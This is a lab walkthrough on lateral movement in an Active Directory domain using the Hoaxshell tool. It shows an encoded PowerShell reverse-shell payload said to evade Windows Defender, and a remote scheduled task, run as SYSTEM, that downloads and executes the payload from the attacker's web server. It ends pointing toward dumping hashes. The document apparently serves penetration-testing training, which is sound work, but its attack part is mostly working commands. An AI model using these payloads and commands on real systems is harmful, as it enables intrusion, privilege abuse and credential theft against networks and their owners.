# Active-Directory - HOAXSHELL

By: `**CyberSec**`

Tool: **HOAXSHELL**

Tool Credit: **Panagiotis Chartas** 

![Untitled](./ActiveDirectory/Hoaxshell/Active-Directory%20-%20HOAXSHELL%20ecfbea82d63e46bea0265e1f7d4b7431/Untitled.png)

In this lab, we will walk through a new tool called **Hoaxshell**. **Hoaxshell** is a Windows reverse shell payload generator and handler that abuses the http(s) protocol to establish a beacon-like reverse shell once executed on target machine. At the time of this demonstration, **HOAXSHELL** payloads work successfully in getting past Windows Defender.

**Scenario:** In an engagement, we have managed to gain local administrative access to a client (CLIENT2) machine within a domain `**(CSL.LOCAL)**`. With our local administrative access on this single computer, we were able to access schedule tasks on another remote system `**(CLIENT1)**` in the same domain (see below). In this lab, we will demonstrate taking advantage of the scheduled tasks as an attack vector in order to move laterally into the domain.

![Untitled](./ActiveDirectory/Hoaxshell/Active-Directory%20-%20HOAXSHELL%20ecfbea82d63e46bea0265e1f7d4b7431/Untitled%201.png)

The following will be our setup to demonstrate the use of hoaxshell.

**Attacker:** 192.168.0.23

**Target 1:** 192.168.0.40

**Target 2:** 192.168.0.31

![Untitled](./ActiveDirectory/Hoaxshell/Active-Directory%20-%20HOAXSHELL%20ecfbea82d63e46bea0265e1f7d4b7431/Untitled%202.png)

To successfully execute this attack, we will: 

1. Download and configure hoaxshell in order to create our payload
2. Host our payload with a web server
3. Create a schedule task on the remote target machine
4. Execute the schedule task on the target machine
5. Revisit web console to confirm that the file (payload) has been downloaded
6. Revisit hoaxshell listener to see if we were able to get a reverse connection

Below is the link to download hoaxshell:

**`Hoaxshell Github Source URL:`** [https://github.com/t3l3machus/hoaxshell](https://github.com/t3l3machus/hoaxshell)

```powershell
sudo python3 hoaxshell.py -s 192.168.0.23 -p 443
```

![Untitled](./ActiveDirectory/Hoaxshell/Active-Directory%20-%20HOAXSHELL%20ecfbea82d63e46bea0265e1f7d4b7431/Untitled%203.png)

```powershell
powershell -e JABzAD0AJwAxADkAMgAuADEANgA4AC4AMAAuADIAMwA6ADQANAAzACcAOwAkAGkAPQAnADgAYQBmADUAMgAzADAANgAtAGEAMgA1ADYAYgAzADMAMAAtADIANgA2ADQANQAxAGQAYQAnADsAJABwAD0AJwBoAHQAdABwADoALwAvACcAOwAkAHYAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwA4AGEAZgA1ADIAMwAwADYAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AZQA4AGEAZQAtAGQAYQA0ADgAIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AYQAyADUANgBiADMAMwAwACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtAGUAOABhAGUALQBkAGEANAA4ACIAPQAkAGkAfQApAC4AQwBvAG4AdABlAG4AdAA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABwACQAcwAvADIANgA2ADQANQAxAGQAYQAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtAGUAOABhAGUALQBkAGEANAA4ACIAPQAkAGkAfQAgAC0AQgBvAGQAeQAgACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACQAZQArACQAcgApACAALQBqAG8AaQBuACAAJwAgACcAKQB9ACAAcwBsAGUAZQBwACAAMAAuADgAfQA=
```

![Untitled](./ActiveDirectory/Hoaxshell/Active-Directory%20-%20HOAXSHELL%20ecfbea82d63e46bea0265e1f7d4b7431/Untitled%204.png)

Copy the generated payload and save it in a file. For the sake of this exercise, we will call the file: 

return_443.ps1

We will host the payload with our temp python web server from our attacking kali linux machine.

```python
python3 -m http.server 80
```

![Untitled](./ActiveDirectory/Hoaxshell/Active-Directory%20-%20HOAXSHELL%20ecfbea82d63e46bea0265e1f7d4b7431/Untitled%205.png)

From our Target 1, we will confirm our ability to schedule task on the remote system - Target 2 (CLIENT1):

```bash
schtasks /S client1
```

![Untitled](./ActiveDirectory/Hoaxshell/Active-Directory%20-%20HOAXSHELL%20ecfbea82d63e46bea0265e1f7d4b7431/Untitled%206.png)

**We will create the schedule task:**

After confirming our schedule task execution possibility, we will setup a scheduled task to download our malicious payload from our listening kali linux python web server on port 80.

```bash
schtasks /create /S CLIENT1.CSL.LOCAL /SC Weekly /RU "NT Authority\SYSTEM" /TN "CYBERSEC" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.0.23/return_443.ps1''')'"

```

![Untitled](./ActiveDirectory/Hoaxshell/Active-Directory%20-%20HOAXSHELL%20ecfbea82d63e46bea0265e1f7d4b7431/Untitled%207.png)

**Then we will remotely execute the schedule task:**

The below command executes the remote task - `CYBERSEC`

```bash
schtasks /Run /S CLIENT1.CSL.LOCAL /TN "CYBERSEC"
```

![Untitled](./ActiveDirectory/Hoaxshell/Active-Directory%20-%20HOAXSHELL%20ecfbea82d63e46bea0265e1f7d4b7431/Untitled%208.png)

Revisiting our Python Web Server Console, we can see that the file was downloaded successfully.

![Untitled](./ActiveDirectory/Hoaxshell/Active-Directory%20-%20HOAXSHELL%20ecfbea82d63e46bea0265e1f7d4b7431/Untitled%209.png)

Also, revisiting our **`HOAXSHELL`** terminal window, we can see that we have a reverse-shell onto Target 2 computer as `**nt authority\system`  aka** `superuser` has been created on port 443.

![Untitled](./ActiveDirectory/Hoaxshell/Active-Directory%20-%20HOAXSHELL%20ecfbea82d63e46bea0265e1f7d4b7431/Untitled%2010.png)

We were able to move laterally onto another computer in the same domain, where we can begin dumping hashes from the system in order to gain access to sensitive information in order to replay it against other systems within the windows domain.